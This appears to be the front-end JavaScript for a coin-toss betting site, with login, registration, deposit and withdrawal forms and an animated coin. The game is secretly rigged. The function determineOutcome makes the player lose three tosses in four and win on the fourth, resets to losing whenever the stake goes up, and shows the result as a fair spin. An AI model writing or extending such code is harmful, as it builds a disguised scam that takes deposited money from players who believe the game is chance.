document.getElementById('login-tab').addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('loginForm').style.display = 'block';
    document.getElementById('registerForm').style.display = 'none';
    document.getElementById('paymentForm').style.display = 'none';
    document.getElementById('passwordRecoveryForm').style.display = 'none';
});

document.getElementById('deposit-tab').addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('paymentForm').style.display = 'block';
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('registerForm').style.display = 'none';
    document.getElementById('passwordRecoveryForm').style.display = 'none';
});

document.getElementById('register-tab').addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('registerForm').style.display = 'block';
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('paymentForm').style.display = 'none';
    document.getElementById('passwordRecoveryForm').style.display = 'none';
});

document.getElementById('forgot-password-link').addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('passwordRecoveryForm').style.display = 'block';
    document.getElementById('loginForm').style.display = 'none';
});

document.getElementById('back-to-login').addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('loginForm').style.display = 'block';
    document.getElementById('passwordRecoveryForm').style.display = 'none';
});

document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const emailOrPhone = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ emailOrPhone, password })
    });
    const data = await response.json();
    alert(data.message);
});

document.getElementById('registerForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('registerPassword').value;
    const response = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, email, phone, password })
    });
    const data = await response.json();
    alert(data.message);
});

document.getElementById('passwordRecoveryForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const recoveryEmailOrPhone = document.getElementById('recoveryEmail').value;
    const response = await fetch('/api/recover-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ recoveryEmailOrPhone })
    });
    const data = await response.json();
    alert(data.message);
});

document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const amount = document.getElementById('amount').value;
    const currency = document.getElementById('currency').value;
    const response = await fetch('/api/deposit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, currency })
    });
    const data = await response.json();
    alert(data.message);
});

document.getElementById('withdrawButton').addEventListener('click', async () => {
    const amount = prompt("Enter the amount you wish to withdraw:");
    if (amount) {
        const response = await fetch('/api/withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ amount })
        });
        const data = await response.json();
        alert(data.message);
    }
});
let tokens = 10000;
let wagerAmount = 0;
let isSpinning = false;
let attemptCount = 0;
let baseWagerAmount = 0;
let slowSpinInterval = null;

document.getElementById("tokenCount").textContent = tokens;

window.addEventListener('load', () => {
    addWinAnimationStyles();
    startSlowSpin();
});

function startSlowSpin() {
    if (slowSpinInterval) return;
    const coin = document.getElementById("coin");
    let spinDegree = 0;
    
    // Use a more frequent interval with smaller increments for smoother animation
    slowSpinInterval = setInterval(() => {
        coin.src = spinDegree % 360 < 180 ? "./images/heads.png" : "./images/tails.png";
        coin.style.transform = `rotateY(${spinDegree}deg)`;
        // Smaller increment (1 degree instead of 2) for smoother rotation
        spinDegree = (spinDegree + 1) % 360;
    }, 30); // Faster refresh rate (30ms instead of 50ms)
}

function stopSlowSpin() {
    clearInterval(slowSpinInterval);
    slowSpinInterval = null;
}

function placeBet(amount) {
    if (tokens >= amount) {
        wagerAmount += amount;
        tokens -= amount;
        updateDisplay();
    } else {
        displayErrorMessage("Insufficient tokens.");
    }
}

function cancelBet() {
    tokens += wagerAmount;
    wagerAmount = 0;
    updateDisplay();
}

function updateDisplay() {
    document.getElementById("tokenCount").textContent = tokens;
    document.getElementById("wagerAmount").textContent = wagerAmount;
}

function displayErrorMessage(message) {
    const errorMessage = document.getElementById("errorMessage");
    errorMessage.innerText = message;
    errorMessage.style.display = "block";
    setTimeout(() => {
        errorMessage.style.display = "none";
    }, 3000);
}

function startCoinToss(choice) {
    if (wagerAmount <= 0) {
        displayErrorMessage("Please place a wager before playing.");
        return;
    }

    if (isSpinning) return;
    isSpinning = true;
    stopSlowSpin();

    const coin = document.getElementById("coin");
    let spins = 0;
    const maxSpins = 30;
    const fastSpinInterval = setInterval(() => {
        coin.src = spins % 2 === 0 ? "./images/heads.png" : "./images/tails.png";
        coin.style.transform = `rotateY(${spins * 180}deg)`;
        spins++;

        if (spins >= maxSpins) {
            clearInterval(fastSpinInterval);
            determineOutcome(choice);
        }
    }, 50);
}

function determineOutcome(choice) {
    // Check if wager has increased compared to previous wager
    if (wagerAmount > baseWagerAmount) {
        attemptCount = 0; // Reset the cycle when wager increases
    }
    
    // Determine if this should be a win (4th attempt) or loss (1st, 2nd, 3rd attempts)
    // Pattern: lose, lose, lose, win (0,1,2 = lose, 3 = win)
    const shouldWin = attemptCount % 4 === 3;
    
    // Set outcome based on win/loss determination
    const outcome = shouldWin 
        ? choice // User's choice for a win
        : (choice === "heads" ? "tails" : "heads"); // Opposite of user's choice for a loss
    
    // Update base wager amount for next comparison
    baseWagerAmount = wagerAmount;
    
    // Increment attempt counter for next round
    attemptCount++;

    const resultMessage = document.getElementById("resultMessage");
    const coin = document.getElementById("coin");

    setTimeout(() => {
        coin.src = outcome === "heads" ? "./images/heads.png" : "./images/tails.png";
        coin.style.transform = `rotateY(${outcome === "heads" ? 0 : 180}deg)`;
        resultMessage.textContent = outcome === choice ? "YOU WON!" : "Try again!";
        resultMessage.style.display = "block";

        // Handle win with animation
        if (outcome === choice) {
            const winAmount = wagerAmount * 2;
            // Start win animation
            showWinningAnimation(winAmount);
            // Apply token glow effect and update tokens
            applyTokenGlow();
            // We'll update tokens slightly delayed to match animation
            setTimeout(() => {
                tokens += winAmount;
                updateDisplay();
            }, 500);
        } else {
            wagerAmount = 0;
            updateDisplay();
        }

        setTimeout(() => {
            resultMessage.style.display = "none";
            isSpinning = false;
            startSlowSpin();
        }, 3000);
    }, 200);
}

// Function to show winning animation
function showWinningAnimation(winAmount) {
    // Create floating win amount element
    const winCounter = document.createElement('div');
    winCounter.className = 'win-counter';
    document.body.appendChild(winCounter);
    
    // Get positions for animation
    const coinElement = document.getElementById('coin');
    const tokenCountElement = document.getElementById('tokenCount');
    
    const coinRect = coinElement.getBoundingClientRect();
    const tokenRect = tokenCountElement.getBoundingClientRect();
    
    // Initial position over the coin
    winCounter.style.left = `${coinRect.left + coinRect.width/2}px`;
    winCounter.style.top = `${coinRect.top + coinRect.height/2}px`;
    
    // Animation variables
    let currentDisplayValue = 0;
    const duration = 2000; // 2 seconds
    const startTime = Date.now();
    
    // Calculate start and end positions
    const startX = coinRect.left + coinRect.width/2;
    const startY = coinRect.top + coinRect.height/2;
    const endX = tokenRect.left + tokenRect.width/2;
    const endY = tokenRect.top + tokenRect.height/2;
    
    // Animation function
    const animate = () => {
        const now = Date.now();
        const elapsed = now - startTime;
        const progress = Math.min(elapsed / duration, 1);
        
        // Easing function for smoother motion
        const easeOutCubic = 1 - Math.pow(1 - progress, 3);
        
        // Calculate current position
        const currentX = startX + (endX - startX) * easeOutCubic;
        const currentY = startY + (endY - startY) * easeOutCubic;
        
        // Update counter value (increasing count)
        currentDisplayValue = Math.min(Math.floor(winAmount * progress), winAmount);
        winCounter.textContent = `+${currentDisplayValue}`;
        
        // Update position
        winCounter.style.left = `${currentX}px`;
        winCounter.style.top = `${currentY}px`;
        
        // Scale and fade based on progress
        const scale = 1 + progress * 0.5;
        const opacity = 1 - (progress * 0.7);
        
        winCounter.style.transform = `translate(-50%, -50%) scale(${scale})`;
        winCounter.style.opacity = opacity.toString();
        
        // Continue animation or end
        if (progress < 1) {
            requestAnimationFrame(animate);
        } else {
            // Add final burst effect
            winCounter.classList.add('win-burst');
            setTimeout(() => {
                document.body.removeChild(winCounter);
            }, 300);
        }
    };
    
    // Start animation
    requestAnimationFrame(animate);
    
    // Clear wager immediately to prepare for next bet
    wagerAmount = 0;
}

// Function to apply glowing effect to token counter
function applyTokenGlow() {
    const tokenCounter = document.getElementById('tokenCount');
    // Remove any existing glow to ensure animation restarts
    tokenCounter.classList.remove('token-glow');
    // Force reflow
    void tokenCounter.offsetWidth;
    // Add glow class
    tokenCounter.classList.add('token-glow');
    
    // Remove glow after 3 seconds
    setTimeout(() => {
        tokenCounter.classList.remove('token-glow');
    }, 3000);
}

// Function to add styles for win animations
function addWinAnimationStyles() {
    const animationStyles = document.createElement('style');
    animationStyles.textContent = `
        .win-counter {
            position: fixed;
            font-size: 28px;
            font-weight: bold;
            color: gold;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.4);
            z-index: 1000;
            pointer-events: none;
            transform: translate(-50%, -50%);
        }
        
        .win-burst {
            animation: burstEffect 0.3s forwards;
        }
        
        @keyframes burstEffect {
            0% { transform: translate(-50%, -50%) scale(1.5); opacity: 0.3; }
            50% { transform: translate(-50%, -50%) scale(2); opacity: 0.4; }
            100% { transform: translate(-50%, -50%) scale(3); opacity: 0; }
        }
        
        .token-glow {
            color: #FFD700 !important;
            text-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700;
            animation: glowPulse 3s ease-in-out;
        }
        
        @keyframes glowPulse {
            0% { text-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700; }
            25% { text-shadow: 0 0 15px #FFD700, 0 0 25px #FFD700, 0 0 35px #FFD700; color: white; }
            50% { text-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700; color: #FFD700; }
            75% { text-shadow: 0 0 15px #FFD700, 0 0 25px #FFD700, 0 0 35px #FFD700; color: white; }
            100% { text-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700; color: inherit; }
        }
    `;
    document.head.appendChild(animationStyles);
}

const style = document.createElement('style');
style.textContent = `
    .coin-container {
        perspective: 1000px;
        margin: 20px auto;
    }
    
    #coin {
        width: 150px;
        height: 150px;
        position: relative;
        transform-style: preserve-3d;
    }
    
    #coin::before {
        content: '';
        position: absolute;
        width: 100%;
        height: 100%;
        background: linear-gradient(to right, #c9b037, #d4af37, #e5bf3f);
        border-radius: 50%;
        transform: translateZ(-5px);
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    
    #coin img {
        position: absolute;
        width: 100%;
        height: 100%;
        backface-visibility: hidden;
    }
`;
document.head.appendChild(style);
